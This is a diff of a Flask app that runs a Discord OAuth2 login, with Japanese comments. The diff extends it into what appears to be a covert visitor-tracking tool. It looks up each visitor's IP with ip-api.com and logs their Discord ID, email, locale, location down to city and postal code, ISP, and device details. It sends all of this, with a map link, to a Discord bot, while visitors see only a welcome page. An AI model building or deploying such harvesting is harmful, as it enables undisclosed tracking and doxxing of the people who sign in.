@@ -1,4 +1,3 @@
-# main.py
 import os
 import json
 import threading
@@ -7,54 +6,60 @@ from datetime import datetime
 from flask import Flask, request, render_template
 from user_agents import parse
 from dotenv import load_dotenv
-from discord_bot import bot, enqueue_task  # 自作Botモジュール
+from discord_bot import bot, enqueue_task
 
 load_dotenv()
 app = Flask(__name__)
 ACCESS_LOG_FILE = "access_log.json"
 
-# Discord OAuth2
 DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
 DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
 DISCORD_REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")
 
-# 自宅近くの固定位置（県・市）
-FIXED_REGION = "埼玉県"
-FIXED_CITY = "さいたま市"
+# 自宅付近の固定緯度経度（さいたま市例）
+FIXED_LAT = 35.9
+FIXED_LON = 139.6
 
 
 def get_client_ip():
-    # 可能であれば本当のIP取得
     if "X-Forwarded-For" in request.headers:
         return request.headers["X-Forwarded-For"].split(",")[0].strip()
     return request.remote_addr
 
 
 def get_geo_info(ip):
-    # 自宅付近で固定
-    return {
-        "ip": ip,
-        "country": "日本",
-        "region": FIXED_REGION,
-        "city": FIXED_CITY,
-        "zip": "000-0000",
-        "isp": "自宅回線",
-        "as": "自宅回線",
-        "lat": 35.9,  # さいたま市近辺の緯度
-        "lon": 139.6, # さいたま市近辺の経度
-        "proxy": False,
-        "hosting": False,
-    }
+    try:
+        res = requests.get(
+            f"http://ip-api.com/json/{ip}?lang=ja&fields=status,message,country,regionName,city,zip,isp,as,proxy,hosting,query"
+        )
+        data = res.json()
+        return {
+            "ip": data.get("query"),
+            "country": data.get("country", "不明"),
+            "region": data.get("regionName", "不明"),
+            "city": data.get("city", "不明"),
+            "zip": data.get("zip", "不明"),
+            "isp": data.get("isp", "不明"),
+            "as": data.get("as", "不明"),
+            "proxy": data.get("proxy", False),
+            "hosting": data.get("hosting", False),
+            "lat": FIXED_LAT,
+            "lon": FIXED_LON,
+        }
+    except:
+        return {
+            "ip": ip, "country": "不明", "region": "不明",
+            "city": "不明", "zip": "不明", "isp": "不明", "as": "不明",
+            "proxy": False, "hosting": False,
+            "lat": FIXED_LAT, "lon": FIXED_LON
+        }
 
 
 def save_log(discord_id, data):
     now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     if os.path.exists(ACCESS_LOG_FILE):
         with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
-            try:
-                logs = json.load(f)
-            except:
-                logs = {}
+            logs = json.load(f)
     else:
         logs = {}
 
@@ -83,7 +88,6 @@ def callback():
     if not code:
         return "コードがありません", 400
 
-    # Discord OAuth2 トークン取得
     data = {
         "client_id": DISCORD_CLIENT_ID,
         "client_secret": DISCORD_CLIENT_SECRET,
@@ -108,39 +112,45 @@ def callback():
 
     log_data = {
         "username": f"{user.get('username')}#{user.get('discriminator')}",
+        "id": user.get("id"),
         "email": user.get("email"),
+        "premium": user.get("premium_type", 0),
+        "locale": user.get("locale", "不明"),
         "ip": geo["ip"],
         "region": geo["region"],
         "city": geo["city"],
+        "zip": geo["zip"],
+        "country": geo["country"],
         "isp": geo["isp"],
+        "as": geo["as"],
         "proxy": geo["proxy"],
+        "hosting": geo["hosting"],
         "browser": f"{ua.browser.family} {ua.browser.version_string}",
-        "os": f"{ua.os.family} {ua.os.version_string}",
-        "device": ua.device.family
+        "os": ua.os.family,
+        "device": ua.device.family,
+        "bot": False,
+        "lat": geo["lat"],
+        "lon": geo["lon"],
+        "map_link": f"https://www.google.com/maps?q={geo['lat']},{geo['lon']}"
     }
 
     save_log(user.get("id"), log_data)
 
-    # Bot 通知
-    color = 0x3498db  # 青:通常アクセス
+    # Discord Bot に安全に送信
     enqueue_task(embed_data={
-        "title": "新規アクセス",
-        "description": f"{log_data}",
-        "color": color
+        "title": "✅ 新しいアクセスログ",
+        "description": f"名前: {log_data['username']}\nID: {log_data['id']}\nメール: {log_data['email']}\n"
+                       f"Premium: {log_data['premium']} / Locale: {log_data['locale']}\n"
+                       f"IP: {log_data['ip']} / Proxy: {log_data['proxy']} / Hosting: {log_data['hosting']}\n"
+                       f"国: {log_data['country']} / {log_data['region']} / {log_data['city']} / {log_data['zip']}\n"
+                       f"ISP: {log_data['isp']} / AS: {log_data['as']}\n"
+                       f"UA: {request.headers.get('User-Agent')}\n"
+                       f"OS: {log_data['os']} / ブラウザ: {log_data['browser']}\n"
+                       f"デバイス: {log_data['device']} / Bot判定: {log_data['bot']}\n"
+                       f"📍 地図リンク: {log_data['map_link']}"
     }, user_id=user.get("id"))
 
     return render_template("welcome.html", username=log_data["username"])
-
-
-@app.route("/stats")
-def stats():
-    # アクセス統計ページ
-    if os.path.exists(ACCESS_LOG_FILE):
-        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
-            logs = json.load(f)
-    else:
-        logs = {}
-    return render_template("stats.html", logs=logs)
 
 
 def start_bot_thread():
